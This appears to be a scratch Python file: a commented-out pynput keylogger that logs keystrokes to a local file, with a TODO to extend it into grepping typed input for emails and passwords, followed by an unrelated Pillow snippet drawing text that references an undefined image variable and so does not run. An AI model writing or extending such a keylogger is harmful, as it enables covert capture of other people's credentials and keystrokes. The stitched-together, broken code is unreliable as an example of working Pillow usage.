# from pynput.keyboard import Key, Listener
#
# count = 0
# keys = []
#
#
# def on_press(key):
#     global keys, count
#
#     keys.append(key)
#     count += 1
#     print("{0} pressed".format(key))
#
#     # every [10] key presses, the file will update
#     if count >= 10:
#         count = 0
#         write_file(keys)
#         keys = []
#
#
# def write_file(keys):
#     with open("log.txt", "a") as f:
#         for key in keys:
#             k = str(key).replace("'", "")
#             if k.find("space") > 0:
#                 f.write("\n")
#             elif k.find("Key") == -1:
#                 f.write(k)
#
#
# def on_release(key):
#     if key == Key.esc:
#         return False
#
#
# with Listener(on_press=on_press, on_release=on_release) as listener:
#     listener.join()
#
# # TODO: Turn keylogger into GREP for email/password cases --> Use REGEX
#

from PIL import Image, ImageFont, ImageDraw


draw = ImageDraw.Draw(image)

# use a bitmap font
font = ImageFont.load("arial.pil")

draw.text((10, 10), "hello", font=font)

# use a truetype font
font = ImageFont.truetype("arial.ttf", 15)

draw.text((10, 25), "world", font=font)